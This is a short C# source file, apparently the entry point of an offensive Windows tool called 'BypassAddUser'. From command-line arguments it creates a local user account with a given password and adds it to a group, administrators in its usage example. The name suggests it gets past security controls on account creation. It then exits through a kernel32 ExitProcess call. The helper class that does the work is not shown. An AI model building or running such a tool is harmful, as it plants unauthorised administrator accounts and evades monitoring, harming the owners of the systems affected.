using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace BypassAddUser
{
    class Program
    {
        [DllImport("kernel32.dll")]
        //链接：https://blog.csdn.net/zxh2075/article/details/8621243
        //链接：https://docs.microsoft.com/zh-cn/dotnet/framework/unmanaged-api/hosting/iclrmetahost-exitprocess-method
        static extern void ExitProcess(uint ExitCode);
        static void Main(string[] args)
        {
            string judgeUser = "-u";
            string judgePass = "-p";
            string judgeGroup = "-g";
            if (args.Length == 6 && args[0].Equals(judgeUser, StringComparison.OrdinalIgnoreCase) && args[2].Equals(judgePass, StringComparison.OrdinalIgnoreCase) && args[4].Equals(judgeGroup, StringComparison.OrdinalIgnoreCase))
            {
                Bypass bypass = new Bypass();
                string username = args[1];
                string password = args[3];
                string groupname = args[5];
                bypass.AddUser(null, username, password);
                bypass.GroupAddMembers(null, groupname, username);
                ExitProcess(1);//结束进程及其所有的线程

            }
            else
            {
                Console.WriteLine("Usage: BypassAddUser.exe -u/-U username -p/-P password -g/-G groups");
                Console.WriteLine("Example: BypassAddUser.exe -u test -p testpass -g administrators");
            }

        }
    }
}
